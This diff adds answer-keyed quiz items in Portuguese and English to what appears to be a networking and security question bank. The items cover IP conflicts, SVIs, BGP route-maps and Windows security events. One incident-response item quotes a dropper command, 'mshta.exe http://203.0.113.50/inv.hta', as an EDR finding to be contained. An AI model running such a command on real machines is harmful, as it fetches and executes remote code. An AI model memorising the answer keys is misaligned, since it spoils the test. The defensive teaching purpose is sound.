@@ -2714,6 +2714,18 @@
         "correct": 2,
         "explanation": "Uma reserva DHCP associa um endereço IP ao MAC da impressora, por isso o servidor dá-lhe sempre o mesmo endereço e os PCs continuam a encontrá-la. Uma concessão mais curta torna as mudanças mais prováveis, não menos, desligar o DHCP para todos estraga os outros dispositivos e a porta do switch não tem nada a ver com o IP que a impressora recebe.",
         "difficulty": "Fácil"
+      },
+      {
+        "question": "Um utilizador configura um IP estático num PC novo. Pouco depois o Windows avisa de um conflito de endereço IP e outro PC da mesma rede começa a perder a ligação ao acaso. Qual é a causa mais provável?",
+        "options": [
+          "O PC novo tem um cabo de rede com defeito, que faz o switch copiar as tramas para todas as portas e baralha o outro PC",
+          "O endereço estático já está a ser usado pelo outro PC, ou está dentro da gama do DHCP e foi-lhe atribuído",
+          "O servidor DNS está a dar o mesmo nome aos dois PCs, por isso o Windows acha que as duas máquinas partilham um endereço",
+          "O gateway predefinido do PC novo está errado, por isso o router responde pelos dois PCs e mistura o tráfego o dia todo"
+        ],
+        "correct": 1,
+        "explanation": "O Windows mostra um conflito de IP quando outro dispositivo responde ao ARP com o mesmo endereço. Um endereço estático tem de ser único e deve ficar fora da gama do DHCP, ou estar reservado, para o servidor nunca o dar a outro. Um cabo estragado, um nome DNS ou um gateway errado não fazem dois equipamentos usar o mesmo IP.",
+        "difficulty": "Fácil"
       }
     ],
     "en": [
@@ -5429,6 +5441,18 @@
         ],
         "correct": 2,
         "explanation": "A DHCP reservation ties one IP address to the printer's MAC address, so the server hands it the same address every time and the PCs keep finding it. A shorter lease makes changes more likely, not less, turning off DHCP for everyone breaks the other devices, and the switch port has nothing to do with the IP address the printer gets.",
+        "difficulty": "Easy"
+      },
+      {
+        "question": "A user sets a static IP address on a new PC. Soon Windows warns about an IP address conflict, and another PC on the same network starts losing its connection at random. What is the most likely cause?",
+        "options": [
+          "The new PC has a faulty network cable, which makes the switch copy its frames to every port and confuses the other PC",
+          "The static address is already in use by the other PC, or sits inside the DHCP pool and was handed out to it",
+          "The DNS server is giving both PCs the same name, so Windows thinks the two machines are sharing one address",
+          "The default gateway on the new PC is wrong, so the router answers for both PCs and mixes up their traffic all day"
+        ],
+        "correct": 1,
+        "explanation": "Windows shows an IP conflict when another device answers ARP for the same address. A static address must be unique and should sit outside the DHCP pool, or be reserved, so the server never gives it to someone else. A bad cable, a DNS name or a wrong gateway don't make two hosts claim the same IP address.",
         "difficulty": "Easy"
       }
     ]
@@ -8291,6 +8315,18 @@
         "correct": 0,
         "explanation": "O 'switchport trunk allowed vlan <lista>' define a lista inteira, por isso escrever só 30 tira a 10 e a 20 do trunk. A forma segura é 'switchport trunk allowed vlan add 30' e a correção agora é voltar a pôr a 10 e a 20. O comando não muda a VLAN nativa nem o modo do trunk, e um trunk leva muito mais do que duas VLANs.",
         "difficulty": "Médio"
+      },
+      {
+        "question": "Num switch de camada 3 um técnico configura 'interface vlan 20' com endereço IP e 'no shutdown', mas o 'show ip interface brief' continua a mostrar a Vlan20 como down/down. O que deve verificar primeiro?",
+        "options": [
+          "A SVI precisa de 'ip routing' ativo para subir, porque sem routing todas as SVIs ficam no estado down/down",
+          "O endereço IP da SVI sobrepõe-se a outra sub-rede do switch, por isso o IOS mantém a interface em baixo para evitar conflitos",
+          "As SVIs só sobem depois de configurado um trunk até ao router, porque o switch precisa primeiro de um next hop para a VLAN",
+          "Se a VLAN 20 existe na base de dados de VLANs e tem pelo menos uma porta access ou trunk ativa que a encaminhe"
+        ],
+        "correct": 3,
+        "explanation": "Uma SVI só sobe quando a VLAN existe no switch e há pelo menos uma porta dessa VLAN, access ou trunk, ativa e a encaminhar (STP). Cria a VLAN com 'vlan 20' e garante que uma porta a leva. O 'ip routing' afeta o routing entre SVIs, não o estado da linha, o IOS recusa um endereço sobreposto em vez de manter a interface em baixo e não é preciso trunk para o router.",
+        "difficulty": "Médio"
       }
     ],
     "en": [
@@ -11150,6 +11186,18 @@
         "correct": 0,
         "explanation": "'switchport trunk allowed vlan <list>' sets the whole allowed list, so typing only 30 removes 10 and 20 from the trunk. The safe way is 'switchport trunk allowed vlan add 30', and the fix now is to put 10 and 20 back. The command does not change the native VLAN or the trunk mode, and a trunk can carry far more than two VLANs.",
         "difficulty": "Medium"
+      },
+      {
+        "question": "On a Layer 3 switch an engineer configures 'interface vlan 20' with an IP address and 'no shutdown', but 'show ip interface brief' keeps showing Vlan20 as down/down. What should be checked first?",
+        "options": [
+          "The SVI needs 'ip routing' enabled before it can come up, because without routing every SVI stays in down/down state",
+          "The IP address of the SVI overlaps another subnet on the switch, so IOS keeps the interface down to avoid a conflict",
+          "SVIs only come up after a trunk to the router is configured, because the switch needs a next hop for the VLAN first",
+          "Whether VLAN 20 exists in the VLAN database and has at least one up access or trunk port that forwards it"
+        ],
+        "correct": 3,
+        "explanation": "An SVI comes up only when its VLAN exists on the switch and at least one port in that VLAN, access or trunk, is up and forwarding (STP). Create the VLAN with 'vlan 20' and make sure a port carries it. 'ip routing' affects routing between SVIs, not their line state, IOS refuses an overlapping address instead of holding the interface down, and no router trunk is needed.",
+        "difficulty": "Medium"
       }
     ]
   },
@@ -13934,6 +13982,18 @@
         "correct": 3,
         "explanation": "Um network statement do BGP só é injetado quando a tabela de routing tem exatamente esse prefixo e essa máscara. As /24 não correspondem a uma /16, por isso nada é enviado. Uma rota estática para Null0 de 10.20.0.0/16 cria a entrada exata (e descarta o tráfego para partes do intervalo não usadas), ou o 'aggregate-address' pode construir o resumo a partir das /24. A palavra mask permite prefixos classless, as rotas OSPF podem ser anunciadas por network statement quando coincidem exatamente e o ISP nunca chegou a ver o prefixo.",
         "difficulty": "Difícil"
+      },
+      {
+        "question": "Para baixar a local preference de um prefixo vindo de um ISP, um técnico aplica uma route-map de entrada com uma só cláusula: 'route-map ISP-IN permit 10', 'match ip address prefix-list ONE', 'set local-preference 50'. Depois de um soft reset, só esse prefixo fica do ISP. Porquê?",
+        "options": [
+          "A route-map acaba num deny implícito e tudo o que falha a cláusula 10 cai; junta um 'permit 20' vazio",
+          "Definir a local preference num prefixo faz o BGP retirar os outros do mesmo vizinho, para o melhor caminho ficar estável",
+          "O soft reset limpa a tabela BGP inteira, e os outros prefixos só voltam depois de chegar o próximo keepalive do vizinho",
+          "A local preference 50 fica abaixo do valor padrão desse vizinho, por isso o BGP marca a sessão toda como pior e filtra-a"
+        ],
+        "correct": 0,
+        "explanation": "Tal como uma ACL, uma route-map nega tudo o que não coincide com nenhuma cláusula. Aplicada à entrada, só mantém os prefixos da lista ONE e descarta o resto. Uma última 'route-map ISP-IN permit 20' sem match deixa passar as outras rotas sem alterações. A local preference é definida por caminho e nunca retira outros prefixos, o soft reset não espera por um keepalive e a sessão em si não é filtrada.",
+        "difficulty": "Difícil"
       }
     ],
     "en": [
@@ -16716,6 +16776,18 @@
         "correct": 3,
         "explanation": "A BGP network statement is injected only when the routing table has that exact prefix and mask. The /24s don't match a /16, so nothing is sent. A static route to Null0 for 10.20.0.0/16 creates the exact entry (and drops traffic for unused parts of the range), or 'aggregate-address' can build the summary from the /24s. The mask keyword allows classless prefixes, OSPF routes can be advertised by a network statement when they match exactly, and the ISP never saw the prefix at all.",
         "difficulty": "Hard"
+      },
+      {
+        "question": "To lower the local preference of one prefix from an ISP, an engineer applies an inbound route-map with a single clause: 'route-map ISP-IN permit 10', 'match ip address prefix-list ONE', 'set local-preference 50'. After a soft reset, only that prefix is left from the ISP. Why?",
+        "options": [
+          "A route-map ends with an implicit deny, so every prefix that doesn't match clause 10 is dropped; add an empty 'permit 20'",
+          "Setting local preference on one prefix makes BGP remove the others from the same neighbor, so the best path stays stable",
+          "The soft reset clears the whole BGP table, and the other prefixes will only come back after the next keepalive is received",
+          "Local preference 50 is below the default for that neighbor, so BGP marks the whole session as less preferred and filters it"
+        ],
+        "correct": 0,
+        "explanation": "Like an ACL, a route-map denies anything that matches no clause. Applied inbound, it keeps only the prefixes in list ONE and drops the rest. A final 'route-map ISP-IN permit 20' with no match statement lets all other routes through unchanged. Local preference is set per path and never removes other prefixes, a soft reset doesn't wait for a keepalive, and the session itself is not filtered.",
+        "difficulty": "Hard"
       }
     ]
   },
@@ -18328,6 +18400,42 @@
         "correct": 0,
         "explanation": "O evento 4720 significa que foi criada uma conta de utilizador e o 4732 que foi adicionado um membro a um grupo local com segurança ativa, aqui o Administrators. Uma conta nova com nível de administrador criada à noite sem pedido de alteração é uma jogada típica de persistência, por isso encontra o criador nos detalhes do evento, desativa a conta e verifica os logons e as ações dela. O Windows Server Backup não cria contas, o password spraying aparece como logons falhados como o 4625 ou o 4771, e nenhum dos eventos tem a ver com arquivo.",
         "difficulty": "Médio"
+      },
+      {
+        "question": "Em dez minutos um controlador de domínio regista o evento 4771 com código de falha 0x18 para 300 contas diferentes, uma ou duas tentativas cada, todas a partir do IP do mesmo posto. Qual é a atividade mais provável?",
+        "options": [
+          "Um dia normal de mudança de palavra-passe, em que a política do domínio obriga todos a escrever uma nova no próximo login",
+          "Desvio do relógio no posto, que faz o Kerberos recusar todos os tickets até a hora voltar a estar certa com o domínio",
+          "Password spraying por Kerberos: poucas palavras-passe comuns testadas em muitas contas para fugir ao bloqueio",
+          "Uma unidade de rede mapeada avariada no posto, que repete em ciclo a palavra-passe guardada para cada utilizador do PC"
+        ],
+        "correct": 2,
+        "explanation": "O evento 4771 é uma falha de pré-autenticação Kerberos e o código 0x18 indica palavra-passe errada. Muitas contas com só uma ou duas tentativas cada, vindas de uma única origem, é o padrão de password spraying, que fica abaixo do limite de bloqueio. O desvio de relógio aparece como código 0x25, um dia de mudança de palavra-passe não vem de um só IP e uma unidade mapeada presa repete uma conta, não centenas.",
+        "difficulty": "Médio"
+      },
+      {
+        "question": "O EDR mostra o WINWORD.EXE a arrancar 'mshta.exe http://203.0.113.50/inv.hta' no portátil de um utilizador, seguido de um processo PowerShell com um comando codificado. Qual é a melhor leitura e a primeira resposta?",
+        "options": [
+          "O Word está a descarregar uma atualização de modelo pelo mshta, o que é normal; permite e junta o IP à lista branca do proxy",
+          "Uma macro usou o LOLBin mshta para correr um HTA remoto; isola o portátil e bloqueia o IP e esse processo filho do Office",
+          "O utilizador abriu um ficheiro de ajuda no Word e o mshta é o visualizador de ajuda HTML; pede-lhe para fechar o Word e repetir",
+          "O PowerShell depois do mshta é o Windows a verificar a assinatura do ficheiro, por isso espera que o Defender acabe de analisar o HTA"
+        ],
+        "correct": 1,
+        "explanation": "O mshta.exe corre HTML Applications com plenos direitos de script, e um HTA remoto lançado pelo Word seguido de PowerShell codificado é uma cadeia clássica de macro maliciosa. Isola o equipamento, bloqueia o endereço e ativa a regra ASR que impede as apps do Office de criar processos filho. Os modelos do Word não vêm pelo mshta, o visualizador de ajuda é o hh.exe e a verificação de assinaturas não lança PowerShell.",
+        "difficulty": "Difícil"
+      },
+      {
+        "question": "Num servidor de ficheiros, o evento 4648 mostra que o utilizador dos RH 'mrosa' correu um processo com as credenciais explícitas de 'adm-backup', um Domain Admin, e depois ligou-se ao C$ de dez servidores em poucos minutos. O que deve concluir o analista?",
+        "options": [
+          "O evento 4648 aparece em todos os logins normais, por isso um utilizador comum usar um nome de admin é esperado e não exige nada",
+          "O serviço de backup corre de propósito com o utilizador dos RH, porque os backups começam sempre na conta mais usada",
+          "O Windows mudou o utilizador para a conta de admin sozinho depois de um aviso UAC, e essa conta abriu as partilhas por si",
+          "Uma sessão dos RH nunca deve ter credenciais de Domain Admin; trata como possível roubo de credenciais e movimento lateral"
+        ],
+        "correct": 3,
+        "explanation": "O evento 4648 regista um login tentado com credenciais explícitas, como no runas ou no 'net use /user'. Um utilizador dos RH a usar uma conta Domain Admin e a mexer em partilhas administrativas de vários servidores aponta para credenciais roubadas usadas em movimento lateral. Desativa ou repõe a 'adm-backup', delimita os equipamentos onde chegou e verifica o portátil dos RH. O 4648 não é escrito em todos os logins, os serviços de backup não correm em sessões de utilizador e o UAC nunca te troca para outra conta.",
+        "difficulty": "Médio"
       }
     ],
     "en": [
@@ -19937,6 +20045,42 @@
         ],
         "correct": 0,
         "explanation": "Event 4720 means a user account was created and 4732 means a member was added to a security-enabled local group, here Administrators. A new admin-level account created late at night without a change request is a typical persistence move, so find the creator in the event details, disable the account and check its logons and actions. Windows Server Backup doesn't create accounts, password spraying shows up as failed logons such as 4625 or 4771, and neither event is about archiving.",
+        "difficulty": "Medium"
+      },
+      {
+        "question": "In ten minutes a domain controller logs event 4771 with failure code 0x18 for 300 different user accounts, one or two attempts each, all from the same workstation IP. What is the most likely activity?",
+        "options": [
+          "A normal password change day, when the domain policy forces every user to type a new password at the next sign-in",
+          "Clock drift on the workstation, which makes Kerberos reject every ticket until time is synced again with the domain",
+          "Password spraying over Kerberos: a few common passwords tried against many accounts to avoid lockout thresholds",
+          "A broken mapped drive on the workstation, which retries the same saved password in a loop for every user on the PC"
+        ],
+        "correct": 2,
+        "explanation": "Event 4771 is a failed Kerberos pre-authentication, and code 0x18 means a wrong password. Many accounts with only one or two tries each from a single source is the pattern of password spraying, which stays under the lockout limit. Clock skew shows as code 0x25, a password change day doesn't come from one IP, and a stuck mapped drive repeats one account, not hundreds.",
+        "difficulty": "Medium"
+      },
+      {
+        "question": "EDR shows WINWORD.EXE starting 'mshta.exe http://203.0.113.50/inv.hta' on a user's laptop, followed by a PowerShell process with an encoded command. What is the best reading and first response?",
+        "options": [
+          "Word is downloading a template update through mshta, which is normal; allow it and add the IP address to the proxy allowlist",
+          "A macro used the mshta LOLBin to run a remote HTA payload; isolate the laptop and block the IP and that Office child process",
+          "The user opened a help file in Word, and mshta is the HTML help viewer; ask the user to close Word and run the file again",
+          "PowerShell after mshta is Windows checking the file's signature, so just wait for Defender to finish its scan of the HTA"
+        ],
+        "correct": 1,
+        "explanation": "mshta.exe runs HTML Applications with full script rights, and a remote HTA started by Word followed by encoded PowerShell is a classic macro dropper chain. Isolate the host, block the address, and turn on the ASR rule that blocks Office apps from creating child processes. Word templates don't come through mshta, the help viewer is hh.exe, and signature checks don't launch PowerShell.",
+        "difficulty": "Hard"
+      },
+      {
+        "question": "On a file server, event 4648 shows that HR user 'mrosa' ran a process using the explicit credentials of 'adm-backup', a Domain Admin, and then connected to C$ on ten servers within minutes. What should the analyst conclude?",
+        "options": [
+          "Event 4648 appears on every normal logon, so a regular user borrowing an admin name is expected and needs no follow-up",
+          "The backup service is running under the HR user by design, because backups always start from the busiest user account",
+          "Windows switched the user to the admin account automatically after a UAC prompt, which then opened the shares on its own",
+          "An HR session should never hold Domain Admin credentials; treat it as possible credential theft and lateral movement"
+        ],
+        "correct": 3,
+        "explanation": "Event 4648 logs a logon attempted with explicit credentials, as with runas or 'net use /user'. An HR user wielding a Domain Admin account and touching admin shares across many servers points to stolen credentials being used for lateral movement. Disable or reset 'adm-backup', scope the hosts it reached, and check the HR laptop. 4648 is not written on every logon, backup services don't run under user sessions, and UAC never swaps you into another account.",
         "difficulty": "Medium"
       }
     ]
